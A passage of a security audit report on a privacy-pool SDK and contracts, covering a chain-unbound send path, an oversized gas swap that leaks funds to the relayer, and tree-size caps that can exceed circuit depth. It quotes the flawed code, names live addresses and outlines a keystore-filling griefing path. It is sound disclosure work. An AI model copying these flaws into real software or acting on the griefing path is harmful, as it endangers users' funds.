Nothing re-establishes either fact on the transaction path. `EIP1193WalletInteractor.sendTransaction` issues the provider's `eth_sendTransaction` with a params object of exactly `from`, `to`, `data` and `value`. There is no `chainId`, so the request carries no statement of which chain it is for and the wallet applies whichever network it happens to be on. `from` is worse than unchecked: it is re-read live through `getAccounts` and never compared to the session's `ownerAddress`, so after an account switch the transaction is sent from the new account, not merely permitted from it. A `chainId` in those params, an account comparison before signing, or a provider in the supported set that rejects a chain-less request would each close the gap, and the send path carries none of the three. The SDK knows how to bind both facts: the sibling `ViemWalletInteractor.sendTransaction` passes `chain` and `account` to viem's `sendTransaction`, which throws before signing when the supplied chain is not the connected one, and `signTypedData` inside `EIP1193WalletInteractor` itself stamps `chainId` into its `EIP712_DOMAIN_TYPE` envelope. The same class binds a chain on the signing path and omits it on the sending path.

`create` is single-use and the session it returns is reused across every later operation, so a user who switches network or account in their wallet after building a session sends the next transaction under wallet state the session never re-examined. The self-submitted, value-bearing entry points `executeDeposit`, `executeSwapAndDeposit`, `executeWithdraw` and `executeRageQuit` all reach the wallet through this path. Where that transaction lands depends on what sits at the configured address on the chain the wallet is on, and all three outcomes are reachable against addresses this repository or its live deployments use.

In the first outcome the deposit succeeds into a live pool on a chain the user did not choose. A production stack is deployed at identical addresses on Ethereum mainnet and BNB Smart Chain: `Entrypoint` `0xca1e072236D231130059eeA6Bfceb7F4e9a1F0C3`, `PoolVault` `0x0Eb42804BF897662aF851370eaeAdcDBEC1b97ed`, `Keystore` `0x6E463391c79b7e1A88eF26E0B023f9A6C9938a71` and `ASPRegistry` `0x259C0BEa1d783c202509BD3b2688d23b8AEf58B0` hold code on both chains, and on neither Optimism, Arbitrum, Base nor Sepolia. The two Entrypoints run the same implementation (`0xce641ed02c54b074BE5d04Ce345d1ceDEAAF39ed` in the ERC-1967 implementation slot on both), the two PoolVaults name the same `AccessRouter` and byte-identical deposit verifier code, and the `AccessRouter` grants `DEPOSITOR_ROLE` to the `Entrypoint` on both. Nothing at the destination rejects it: `Entrypoint.deposit` reads the asset and value out of the proof and gates only on `_config.enabled` and `_value >= _config.minAmount`, and `PoolVault.deposit` gates on the proof verifying and on `_proof.context()` equalling the hash of the note data. That context binds the proof to the note data alone, not to a chain and not to a pool address, and no contract in the tree reads `block.chainid`, so the same Groth16 proof verifies on the twin chain exactly as on the intended one. The live asset tables read on chain show native enabled and `vettingFeeBPS` of 0 on both, so `computeMsgValue` produces `msgValue == value` and the `msg.value` equality checks in `Entrypoint` and `PoolVault` both pass. The minimums are `4e15` base units (0.004 ETH) on mainnet and `2e16` base units (0.02 BNB) on BSC, and there is no maximum, because the `5e17` and `2e18` base-unit values in those tables are `maxRelayFee`, which `deposit` never reads. Both vaults report `paused() == false`.

In the second outcome the value is stranded at an address with no code, permanently. That is the outcome for every configuration whose configured address has no counterpart on the chain the wallet switched to, and it includes the configuration the SDK ships. `DEPLOYMENTS` is frozen with a single entry, Sepolia, whose `Entrypoint` `0xEB3e3961008952348445513e418ad6F43C23ca9a` and `PoolVault` `0x09b94d3127019298757A6ceeB7911922085f7C01` hold code on Sepolia and on no other chain checked, with mainnet, BSC, Optimism, Arbitrum and Base all returning empty code for both. The repository's own `deployments-it-003.json` pairs mainnet with `Entrypoint` `0x02a1E00294291d0E938eC92A8c2883044524ec4B`, which likewise holds no code on BSC, Arbitrum or Base. A `CALL` carrying value to an address with no code does not revert; it transfers the value and returns success. No gate runs, because `Entrypoint.deposit` is not there to run, so nothing applies the enabled check or the `minAmount` floor, nothing bounds the amount, and the value rests permanently at an address for which no private key exists.

The third outcome is a loud revert with the funds safe: a mainnet session switched to BSC depositing in the band `4e15 <= V < 2e16` fails the twin chain's higher floor with `Entrypoint_BelowMinAmount`, and a configured address holding a different contract type at the destination reverts on selector mismatch, as the `deployments-it-003.json` mainnet `Entrypoint` address does on Optimism, where it is the `PoolVault` and answers `depositVerifier()` while reverting the `Entrypoint` deposit selector.

The same missing re-check reaches the keystore, on the self-submitted path only. `PoolSessionKeystore.executeRegisterKeystore` routes its `setAuthPolicy` calldata through `KeystoreInteractor.submitTransaction` into the same unbound `sendTransaction`, while the relayed variant stamps `chainId` into the EIP-712 domain through `buildSetAuthPolicyTypedData` and is signed with `signTypedData`, which mainstream wallets do validate against the connected chain. `Keystore.setAuthPolicy` keys everything on `msg.sender`, and `_setAuthPolicy` requires `$.nullifyingKeys[_account] == 0` before inserting the leaf, so the write is one-shot and permanently consumes that account's keystore slot.

Each branch needs a configuration that makes it bite. The twin-chain branch needs an integrator-supplied `config.deployment` pairing a production chain with the twin-deployed addresses, because `DEPLOYMENTS` holds Sepolia alone and `resolveDeployment` throws `UnsupportedChainId` otherwise, and no such pairing appears anywhere in this repository. The stranded branch needs no integrator input at all on the Sepolia default, but does need a user holding and depositing mainnet value through a testnet-configured session. No attacker is required or possible in either: the trigger is the user's own network or account switch, an ordinary action in a multi-chain wallet. The reference integration does not compensate, since the sample web deposit flow constructs a chain-bound viem `walletClient` and then hands the raw injected provider to `EIP1193WalletInteractor` instead, and builds its session through `PoolSessionFactory.create`, which performs no account or chain assertion at all.

#### Evidence

- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/walletInteractors/EIP1193WalletInteractor.ts#L45-L75
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/walletInteractors/ViemWalletInteractor.ts#L36-L46
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/poolSessions/PoolSessionBuilder.ts#L1064-L1085
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/constant/deployments.ts#L10-L27
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/Entrypoint.sol#L57-L91
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/PoolVault.sol#L97-L134

#### Impact

A mis-routed deposit costs the user the whole deposit until they diagnose the cause unaided. Value is not destroyed on the twin-chain branch, since it sits in a live pool under a commitment whose `noteSecret` and `depositSecret` the SDK persisted, but the session that made it scans the other chain's vault, so the note stays pending forever and nothing tells the user the funds are recoverable. Direction decides whether anything stops it: mainnet to BSC has a narrow protective band, since a value in `[4e15, 2e16)` reverts with `Entrypoint_BelowMinAmount`, while BSC to mainnet has none, since any value legal on BSC clears mainnet's `4e15` floor. With `vettingFeeBPS` at zero on both sides and no maximum in `deposit`, per-occurrence exposure is the user's entire deposit amount, and the two live vaults currently hold 0.1609 ETH and 0.135 BNB. The user sees only viem's 180-second `waitForTransactionReceipt` timeout, wrapped as `WaitForReceiptError`, which names neither cause nor remedy, so a user who concludes the deposit failed and retries has made two deposits, one invisible to them. On the stranded branch there is no recovery at all, and binding the chain into the proof context would not help, because nothing is at the destination to check a proof. The keystore consequence is smaller in value and worse in kind: a self-submitted authorisation write from the wrong account cannot be undone, and `AuthPolicySet` publishes that account alongside the nullifying-key hash the user is using under a different address, a public link between two addresses the user may have been keeping apart.

#### Recommendation

We recommend binding the chain and the account on the send path. Include `chainId` in the params `EIP1193WalletInteractor.sendTransaction` issues, so that a wallet on the wrong network rejects the transaction rather than executing it somewhere else, and compare the wallet's current account against the session's `ownerAddress` immediately before signing rather than taking whatever `getAccounts` returns and using it as `from`. This is the change that closes both fund-bearing outcomes, and it makes the EIP-1193 interactor behave the way its viem sibling already does. Subscribing to the wallet's `chainChanged` and `accountsChanged` events and re-validating or invalidating the session when either fires would catch a switch at the moment it happens rather than at the next transaction; neither event name appears anywhere in the monorepo today.

We also recommend bringing the reference integration in line with the guidance it implies. The sample web deposit flow already constructs a chain-bound viem wallet client and then discards it in favour of the raw injected provider, so passing that client through `ViemWalletInteractor`, and building the session through `PoolSessionBuilder` so that the account and chain assertion runs at all, would make the shipped example demonstrate the safe path. Where a deposit cannot be located after submission, reporting what the configured addresses hold on the chain the wallet reports would turn an irrecoverable-looking loss into a recovery the user can perform, and would name an address with no code at the destination rather than leaving a bare timeout.

#### Verification

**Verdict: CONFIRMED** by reading the named functions against the reviewed commit, and by the permalinked sources in the evidence section above.

### #014 — The B2 gas swap buys 2.10x the bridge fee, so 52.7% of the user's slice is swept to the relayer

**Severity:** Medium · **Location:** `packages/sdk/src/services/poolSessions/PoolSessionReshieldCrosschain.ts` · **Bug:** Medium · **Payout:** Medium · **Novelty:** DIFF · **Reach:** PERM · **Root cause:** RC-02 (2 findings) · **Status:** Open

#### Description

A cross-chain reshield burns a user's note on one chain, bridges the money, and redeposits it on another. Some bridge routes charge a messaging fee of their own, and they charge it in the source chain's native ETH, paid as the `msg.value` of the bridge call. The withdrawal itself pays out an ERC-20 and the relayer is not asked to front that ETH, so `RelaySwaps` mints it inside the same transaction, in the step the repository labels B2: it sells a slice of the user's withdrawn tokens for ETH, forwards that ETH with the bridge call, and sweeps whatever ETH is left in the contract when the call returns.

The slice has to be bought before the bridge is called, against a fee quoted earlier still, so it is deliberately oversized and the sweep disposes of the surplus. Two things are supposed to keep that surplus from becoming a charge on the user. The relayer's fee for the whole service is quoted up front and capped, 80 bps of the withdrawal on the route the repository captured. And a budget check exists so that value cannot escape that cap by leaving as dust instead: it bounds the dust at 300 bps of the post-fee amount.

**Where it breaks.** The swap is sized for a fee more than twice the size of the one the route charges, and neither the contract nor the budget check measures the difference:

- the swap buys 2.10x the quoted bridge fee, and the bridge consumes 1.00x of it;
- the contract requires that the swap produced at least the ETH the bridge needs, and never that it produced no more than that;
- the budget check counts the slice as part of the relayer's fee, so the slice is subtracted from the base the 300 bps is measured against instead of being measured by it, and the check carries no ETH term at all.

So the leftover, 1.115x the bridge fee and 52.7% of the slice the user paid for, is swept to the relayer on every reshield that takes this route: 772 bps of a 25 USDC withdrawal on the repository's own captured fixture, against the 80 bps the user agreed to, and no configuration a caller can reach returns it to the user privately.

In the `PoolSessionReshieldCrosschain` session, `sizeB2GasSwap` sizes the native bridge fee that `RelaySwaps` mints in-contract on a cross-chain reshield. It takes LiFi's quoted `transactionValue`, doubles it, then quotes an exact-output swap for another 5% on top:

```ts
const rawValue = BigInt(args.transactionValue);
const swapValue = (rawValue * B2_SWAP_VALUE_HEADROOM_BPS) / 10_000n;  // 20_000 -> 2.00x
const gasSwapTargetOut = (swapValue * B2_GAS_SWAP_OUT_HEADROOM_BPS) / 10_000n;  // 10_500 -> 2.10x
```

The quote is requested with `amountType: "to"`, so the gas swap buys 2.10x the bridge fee worth of ETH, and the user pays for it: `gasSwapInput`, the input-token slice the swap consumes, is carved out of the main swap's budget in the same step that re-quotes it.

On-chain, `RelaySwaps.execute` is written as a numbered sequence of steps in its own comments, and step 9.5 runs that swap and checks the result in one direction only:

```solidity
require(
    address(this).balance - _ethPreGasSwap >= _r.swapValue,
    RelaySwaps_GasSwapInsufficient()
);
```

That is a floor, and `execute` has no matching ceiling. Step 10 forwards exactly `swapValue`, which is 2.00x, as `msg.value`; the bridge consumes 1.00x; the delta-only `_sweepDust` in step 13, on its ETH leg, then pays the whole positive ETH delta to `dustRecipient`. `_ethBefore` is snapshotted in step 6, before `POOL.transact` pulls the notes in step 8, so everything inside that delta is withdrawn user principal. `dustRecipient`, the source-chain address the proof-bound routing names for anything left in the contract, defaults to the relayer at all three SDK call sites.

The ledger, from the repository's own captured route fixture (`packages/swaps/test/fixtures/b2-lifi-op-usdc-to-mainnet-usdc.json`, OP-USDC to Mainnet-USDC over Stargate V2, captured 2026-08-31, on a 25 USDC withdrawal):

| quantity | wei | multiple of the LayerZero fee |
| --- | --- | --- |
| `fee.nativeFee` the bridge consumes | 706,815,319,774,602 | 1.000x |
| `swapValue` forwarded as `msg.value` | 1,413,630,639,549,204 | 2.000x |
| ETH the gas swap is quoted to mint (`toAmount`) | 1,494,754,649,925,657 | 2.115x |
| swept to `dustRecipient` | 787,939,330,151,055 | 1.115x |

Read together, those rows are one arithmetic. The gas swap mints 2.115x the fee; step 10 forwards 2.000x of it as `msg.value`; the bridge consumes 1.000x, which is the LayerZero messaging fee the route quoted; and the 1.115x that remains above the step-6 snapshot is what the step-13 sweep pays out, the roughly 1.00x of `msg.value` the bridge does not spend plus the roughly 0.115x the swap over-minted.

Decoding the fixture's `mainSwap.transactionData` against the repository's own `STARGATE_FACET_ABI` settles two things. `_stargateData.fee.nativeFee` equals `mainSwap.transactionValue` exactly, so the fee the endpoint charges is a calldata argument frozen inside the proof-bound blob, and raising `msg.value` cannot raise it: the 2x headroom buys no tolerance on the axis its own comment names. `_stargateData.refundAddress` decodes to `0x00000000000000000000000000000000b2b2b2b2`, the fixture's own `executor` field and so `RelaySwaps` itself, so the unspent `msg.value` returns to the contract where `_sweepDust` catches it.

One leg of that ledger is not settled in-repo: the larger swept leg is the roughly 1.00x `msg.value` refund, whose timing rests on LiFi source that is not vendored here. `RelaySwapsB2Fork.t.sol`, the repository's own probe, computes the answer and `console.log`s it instead of asserting it, behind a `B2_FORK_RPC_URL` gate that skips silently when unset. If the refund never arrives in the call frame, only the roughly 0.10x overshoot is swept; if it arrives after `execute` returns, the ETH strands in `RelaySwaps` behind the `onlyOwner` `rescue()` with no per-user attribution. Both branches are adverse to the user; only the payee changes.

The path is wider than the contract's comments assume. The step-9.5 comment in `RelaySwaps.execute` states that `swapValue == 0` on "every non-Mainnet-destination reshield", but the SDK gate is `!isNativeInput && BigInt(lifiQuote.transactionValue) > 0n`, with no `destinationChainId` term: `ETHEREUM_MAINNET_CHAIN_ID` appears twice in the file, its declaration and one use in the estimate's Mainnet-gated reserve, and the sizing path never references it. Any ERC-20-input cross-chain reshield on a route that quotes a native fee takes this path, on any destination, and on a non-Mainnet destination nothing is reserved at all, against a gas slice measured at 1,476 bps of the post-fee amount on the fixture.

The two numbers a caller can actually see are missing or wrong. `gasSwapInput` is never exported: it sits on no exported type and no returned object, appearing outside its own module only in two capture and analysis scripts under `packages/swaps/scripts`, so an integrator cannot compute the residual without re-pricing the gas swap. `ReshieldCrosschainEstimate.netSwapAmount` is documented as "Net amount after fee, used for LiFi swap" and computed as `amount - feeAmount`, but on a B2 route the LiFi swap is funded with `amount - feeAmount - gasSwapInput`: on the fixture the field reports 24.800000 USDC where the main swap is actually funded with 20.927739 USDC, overstating the swapped principal by 18.5%. That is a wrong return value from the public API, not documentation drift.

The sweep is documented, its magnitude is not: the `SwapRouting` comment block says "the overshoot is swept to `dustRecipient` by the delta-only sweep in step 13" and no source states a size. A repo-wide grep of every `.md` file returns zero hits for `swapValue`, `gasSwapMaxInput` or `gasSwapCalldata`, against a control of 14 `.md` files that do hit `dustRecipient`; `docs/tech-design/**`, which `CLAUDE.md` designates the source of truth, does not describe the gas swap at all and still publishes an 11-member `SwapRouting` against the 14 the contract now decodes; and `agents/deviations.md` has no B2 entry.

The guard built for this class of leak cannot see this channel. `SWAP_DUST_TOLERANCE_BPS = 300n`, in `LiFiBudget`, exists, in its docstring's words, so that "a relayer that under-quotes the fee cannot inflate net and shift value from the capped fee into uncapped dust". `assertLifiBudget` computes `netSwapAmount = amount - feeAmount`, then `dust = netSwapAmount - lifiFrom` against `maxDust = netSwapAmount * 300 / 10000`. Both B2 call sites hand it the gas-swap slice inside the fee argument, once on the quote and again against the committed fee:

```ts
assertLifiBudget(lifiQuote.fromAmount, amount, (budgetFeeAmount + gasSwapInput).toString());
```

The tolerance base shrinks to `amount - feeAmount - gasSwapInput` before dust is measured, so the slice is subtracted from the quantity the bound applies to. On the fixture the check sees `dust` = 211,392 against `maxDust` = 634,173 and passes; against the un-shrunk base it would have seen 3,872,261 against 744,000 and thrown. All four are USDC base units, and USDC has six decimals, so the second pair is 3.872261 USDC of dust measured against a ceiling of 0.744000 USDC. The guard carries no ETH term at all, so the larger channel sits outside it by construction. `INTL-08`, the accepted deviation covering relayer dust, rests explicitly on "the leak is bounded (300 bps)".

No reachable configuration returns the ETH residual to the user privately. The two levers a caller has are an explicit `dustRecipient`, naming a source-chain address of their own in place of the relayer's, and the `dustRescue` opt-in, under which the relayer is expected to forward what is left to a stealth address the user controls:

| configuration | ETH residual (~90% of the leak) | input-token residual (~10%) |
| --- | --- | --- |
| default | relayer | relayer |
| explicit `dustRecipient` | user, at the cost of the permanent public source-chain linkage that `withdraw-and-swap.md` says the default exists to prevent | user |
| `dustRescue` opted in | relayer, and the forwarder skips it | forwarded to the stealth rescue recipient |
| explicit `dustRecipient` with `dustRescue` | rejected by the session guard | rejected |

Under `dustRescue` an explicit `dustRecipient` throws `DustRescueRecipientConflict`, and the relayer's forwarder is ERC-20 only: `dust-rescue-forwarding.service.ts` says native ETH dust "has no such log and is silently skipped". The one feature advertised as recovering the user's residual covers about 10% of it, 0.211 USDC of 2.141 on the fixture.

The relayer has no lever here: `assertReshieldCrosschainRouting` rejects all three B2 fields unless each is bit-identical to the SDK's own `sizeB2GasSwap` output, and `swapValue` is derived client-side from LiFi's quote, so a relayer cannot enlarge the residual, only receive it.

#### Evidence

- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/poolSessions/PoolSessionReshieldCrosschain.ts#L992-L1003
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/swaps/contracts/src/RelaySwaps.sol#L349-L358
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/swaps/contracts/src/RelaySwaps.sol#L412-L433
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/poolSessions/PoolSessionReshieldCrosschain.ts#L552-L555
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/types/PoolSessionReshieldCrosschain.ts#L126-L131

#### Impact

The residual is the minted ETH minus `fee.nativeFee`, and the mint target is a fixed multiple of that fee, so the ratio is invariant: 1.115x the LayerZero fee, or 52.7% of the gas slice, on every qualifying reshield. Against principal it is not invariant: the incidence is regressive. On a 25 USDC reshield it is 772 bps, 9.6x the 80 bps `feeAmount` the user was quoted; on a 2,500 USDC one it is about 7.7 bps. A privacy pool encourages small uniform notes, so the expensive end is the ordinary case, and `ChainAssetRegistry` ships `minAmount: 1` on all thirteen production entries.

Absolute exposure is small and hard-capped. `max_swap_value_wei` defaults to 0.005 ETH and is enforced twice, at quote time in `EvmQuoteService.quoteSwap` and again at relay time in `EvmRelayService.relaySwap`, capping the residual at roughly 0.00279 ETH per transaction. At the fixture's implied rate of about $2,450 per ETH, that is $1.93 on the fixture and about $6.80 at the ceiling. It scales with the number of qualifying reshields, not with principal, TVL or pool size, and the only deployment-shaped relayer config in the repository, `relayer.config.example.json`, sets `relay_swaps_contract` to the zero address, so production B2 volume is not observable here.

`estimateReshieldCrosschainAmount` does hold back 3% for the slice, so the user receives the `noteValue` they were quoted, but that reserve is flat across relayers and roughly five times under the actual slice on a 25 USDC route, and the returned object carries no gas-swap line item, so the quoted number does not move with the charge.

#### Recommendation

We recommend re-sizing `swapValue` from the final `lifiQuote.transactionValue` after the re-quote instead of the pre-re-quote value, and cutting `B2_SWAP_VALUE_HEADROOM_BPS` from `20_000` to a drift-sized value. Since `fee.nativeFee` is frozen in the proof-bound calldata, `nativeFee` plus a small epsilon for router rounding is enough, and `RelaySwaps_GasSwapInsufficient` already covers the shortfall case. Add the missing ceiling in `execute` beside the existing floor so the swept ETH delta is bounded on-chain, and route the B2 ETH sweep to a user-controlled destination rather than `dustRecipient`. On the SDK surface, subtract the gas-swap slice from `netSwapAmount` or add an explicit `gasSwapInput` field to `ReshieldCrosschainEstimate` and `PreparedReshieldCrosschainQuote`; key the estimate's reserve on `transactionValue > 0` rather than `destinationChainId === 1`; allow an explicit `dustRecipient` together with `dustRescue` instead of rejecting the pair; and extend dust-rescue forwarding to the native channel, which is sizeable from the balance delta even without a `Transfer` log.

We also recommend documenting all 14 `SwapRouting` fields and the B2 flow in `docs/tech-design/`, adding the B2 entry to `agents/deviations.md`, and turning the `console.log` branch in `RelaySwapsB2Fork.t.sol` into an assertion on `dustDelta` so the refund branch is pinned in CI rather than printed. Two points belong in that write-up. If the residual is intended relayer compensation for performing the B2 gas swap, the fee schedule needs reconciling, since `EvmQuoteService.quoteSwap` already surcharges 160,000 gas into the capped `feeAmount` for that same work with no credit for the residual. And `B2_SWAP_VALUE_HEADROOM_BPS = 20_000` needs the LayerZero fee drift measurements behind it: the one captured fixture re-quotes to an identical fee, 0% drift, and the headroom cannot absorb drift on the axis its comment claims.

#### Verification

**Verdict: CONFIRMED** by reading the named functions against the reviewed commit, and by the permalinked sources in the evidence section above.

### #015 — The tree-size setters accept caps above the compiled circuit depth, a size no deployed circuit can prove against

**Severity:** Medium · **Location:** `packages/contracts/src/contracts/Keystore.sol` · **Bug:** High · **Payout:** Medium · **Novelty:** NEW · **Reach:** PRIV · **Root cause:** RC-05 (2 findings) · **Kill chain:** KC-02 · **Status:** Open

#### Description

A deployment keeps two Merkle trees on chain. One holds the pool's value, a leaf per note created and a leaf per note spent; the other holds one leaf per registered account, which is what lets someone prove they control a note without revealing which account they are. Spending proves membership in those trees, and the circuits those proofs have to satisfy are compiled ahead of time for a fixed maximum tree depth, frozen into the verifying key. Each tree gains a level every time its leaf count crosses a power of two, so each carries an on-chain cap on its leaf count, sized to the depth its circuits were compiled for, and an operator can raise that cap.

A tree deeper than its circuits allow has no satisfying witness, so no proof against it can be produced at all, and a tree that has gained a level never gives it back. Depth only ever increases: the tree library raises it on insert and never lowers it, and nothing in this repository removes a leaf. Recovering means moving the circuits to the tree rather than the tree to the circuits, a fresh trusted setup for all 26 circuits and a re-pointed verifier set, performed by the same privileged role that ragequit exists to route around, and finished long after the twenty minutes for which the last provable root stays accepted.

**Where it breaks.** The cap and the compiled depth are two numbers that have to agree, and nothing executable compares them:

- each setter checks its new cap against the tree's current leaf count and against nothing else, and the initializers validate nothing at all;
- the interfaces state the rule in NatSpec, that the cap must stay in lockstep with the circuit's depth parameter, and no statement in the contracts or the deploy scripts reads a circuit depth;
- the deploy-time check that does bound the keystore cap bounds it with the state tree's constant, 16,384x above the depth the keystore circuits carry.

One accepted cap raise on the keystore therefore ends the pool for everybody in it twenty minutes later, taking `ragequit`, the exit the protocol documents as always available, along with the compliance-gated spend.

An unprivileged party chooses when that call gets made: filling the keystore is permissionless, and the error a full tree raises points the operator at this setter as the only remedy the interface offers.

In the `Keystore` contract, the `setMaxKeystoreTreeSize` function checks its argument against the tree's current occupancy and against nothing else:

```solidity
// Keystore.setMaxKeystoreTreeSize
function setMaxKeystoreTreeSize(uint256 _maxKeystoreTreeSize) external checkAccess(UPGRADER_ROLE) {
  KeystoreRootStorage storage $ = _getKeystoreRootStorage();
  require(_maxKeystoreTreeSize > $.keystoreTree.size, Keystore_InvalidMaxTreeSize());
  uint256 _previous = $.maxKeystoreTreeSize;
  $.maxKeystoreTreeSize = _maxKeystoreTreeSize;
  emit MaxKeystoreTreeSizeUpdated(_previous, _maxKeystoreTreeSize);
}
```

`PoolVault.setMaxStateTreeSize` is the same shape, with `require(_maxStateTreeSize > $.stateTree.size, PoolVault_InvalidMaxTreeSize())` as its only guard. Both initializers are looser still: `Keystore.initialize` assigns `$.maxKeystoreTreeSize` and `PoolVault.initialize` assigns `$.maxStateTreeSize`, neither with any validation at all. Saturation, below, means a tree holding exactly as many leaves as its configured cap, so the next insert reverts.

Each deployment keeps two on-chain Merkle trees. The state tree, in `PoolVault`, holds the pool's value as a timestamped hash per note commitment and per nullifier; the keystore tree, in `Keystore`, holds one auth-policy leaf per registered account, which is what lets someone later prove they control a note without revealing which account they are. Both are LeanIMTs, and that implementation is not first-party code: it is `@zk-kit/lean-imt.sol`, pinned at version 2.0.1 and reached through a symlink into `node_modules`, so none of it is committed to this repository. Its trees are append-only, and their depth grows by one whenever the leaf count crosses a power of two: a tree holding up to 2^18 leaves has depth 18, and the leaf after that takes it to depth 19.

Depth only ever goes up, and that is a property of the library rather than of anything in this repository. Inside `InternalLeanIMT`, `self.depth` is written at exactly two sites, once in `_insert` and once in `_insertMany`, and both writes are increments guarded by `if (2 ** treeDepth < index + 1)`. `_update` copies the depth into a local and never writes it back, and `_remove` is a one-line delegation to `_update`. On this repository's own side of the boundary, `.remove(` has zero callers anywhere under `packages/contracts/src/`. A single `self.depth` decrement or a reachable `remove` call would falsify this, and at version 2.0.1 there is neither. The monotonicity this defect turns on is therefore an invariant of a dependency this repository does not control, asserted nowhere in the repository and pinned only by an exact version.

Spending is done with Groth16 proofs produced by Circom templates compiled at a fixed maximum tree depth, a parameter frozen into the verifying key at compile time; a tree deeper than that maximum has no satisfying witness, so no proof against it can be produced at all. `transact`, the private transfer and private withdrawal path, proves membership in both trees. `ragequit` matters here more: it skips the Association Set Provider's compliance check, forces a public withdrawal to the note's own owner address, and proves membership in the keystore tree only. The contracts treat it as always reachable, in that `whenNotPaused` appears on exactly two functions in `PoolVault`, `deposit` and `transact`, while `ragequit` carries only `external nonReentrant`, and the contracts technical design document states the intent in one line: "Ragequit always available: `ragequit()` is not pausable - users can always exit."

The circuits hard-constrain depth. In the `Transact` template, a component named `keystoreDepthCheck` asserts `out === 1` for `keystoreTreeDepth <= keystoreMaxDepth`, and `stateDepthCheck`, instantiated once per spent input, does the same for `stateTreeDepth <= stateMaxDepth`. The `Ragequit` template carries its own `keystoreDepthCheck` independently. Every compiled circuit pins the parameters: all 25 files under `circuits/main/transact/` instantiate `Transact(N, M, 22, 18, 18)`, giving a state maximum of 22 and a keystore maximum of 18, and `packages/circuits/circuits/main/ragequit.circom` instantiates `Ragequit(18)`. The shipped caps exhaust those depths with no headroom: `ChainConfigRegistry`, the deployment script's table of per-chain parameters, sets `maxKeystoreTreeSize: 262_144` (`2**18`) and `maxStateTreeSize: 4_194_304` (`2**22`) in `_sepoliaConfig`, and the identical pair repeats in `_mainnetConfig`, `_arbitrumConfig` and `_baseConfig`.

Put the two together and at saturation the setter has no safe value. Once `keystoreTree.size == 262_144`, the `require` in `setMaxKeystoreTreeSize` demands an argument strictly greater than `262_144`, and the smallest such argument, `262_145`, is exactly the one that lets the `Keystore_KeystoreTreeFull` check in `_setAuthPolicy` admit the 262,145th leaf and ratchet the tree to depth 19. Every value the setter will accept is fatal, and the operator's only safe action is to not call it.

An unprivileged party chooses when the operator has to make that call. `Keystore.setAuthPolicy` and `Keystore.setAuthPolicyWithSig` are permissionless and unmetered, one leaf per account, and reaching the cap surfaces as `Keystore_KeystoreTreeFull`, the point at which no new user can register. The only remedy the contract offers for that error is the setter above, so the error message and the setter's shape point the operator straight at the one argument that cannot be walked back. Getting there costs gas and nothing else: the committed Foundry gas snapshot (`.gas-snapshot`) records a 359,099-gas mean for `test_SetAuthPolicy_WhenCallerDoesNotHaveAnAuthPolicy`, a whole-test mean that carries the test's own setup overhead alongside the registration and comes from a shallow test tree rather than a 17-level one, so 262,144 registrations is only good for an order of magnitude, roughly 10^10 to 10^11 gas. That is affordable on the two chains carrying live deployments, `_arbitrumDeployment` and `_baseDeployment` in `ChainDeploymentRegistry`, where `_mainnetDeployment` still reverts `'ChainDeploymentRegistry: mainnet not deployed yet'` and `ChainConfigRegistry._canonGuardFactoryForChain` returns `address(0)`, so the Safe-based Canon Guard used elsewhere sits between nobody and this call.

The operator is not blind. `IKeystore`'s NatSpec on `setMaxKeystoreTreeSize` warns at the setter itself: "Must stay in lockstep with the circuit parameter `keystoreMaxDepth` (`2^keystoreMaxDepth`); raising the cap above the circuit capacity leaves proofs beyond the circuit limit unverifiable." `IPoolVault` mirrors it on `setMaxStateTreeSize`. What is missing is enforcement: every occurrence of `keystoreMaxDepth` or `stateMaxDepth` under `packages/contracts/src/` and `packages/contracts/script/` sits inside a comment, four in `IKeystore` and four in `IPoolVault`, and no executable statement in either tree reads a circuit depth. Any `require`, timelock or argument allowlist in that set would falsify the claim. Neither NatSpec block says the step cannot be undone with a second call to the same setter, and neither says that on the keystore it also disables `ragequit`.

The test suite pins the gap as intended behaviour: `test_SetMaxKeystoreTreeSize_WhenNewMaxSizeIsGreaterThanCurrentTreeSize` bounds the fuzzed new cap to `[_treeSize + 1, type(uint256).max]`, calls the setter, and asserts the value is stored. Deploy time is no better, and it is wrong by a specific factor. `DeploymentVerifier`, the script-side helper that sanity-checks a chain config before a deploy proceeds, caps `maxKeystoreTreeSize` in `validateSystemConfig` with `LIKELY_MAX_STATE_TREE_SIZE = 1 << 32`, the state tree's constant, so against a compiled `keystoreMaxDepth = 18` the deploy guard is 16,384x too permissive, and its header comment disclaims those constants as "deploy-time heuristic bounds ... not protocol-enforced". Its test file has no case for an over-large keystore cap either; the four `maxKeystoreTreeSize` sites there cover the power-of-two rule and the `maxStateTreeSize >= maxKeystoreTreeSize` ordering, and the only "too large" case sets `maxStateTreeSize` to `1 << 33`. A case asserting a revert for a keystore cap above `1 << 18` would falsify this.

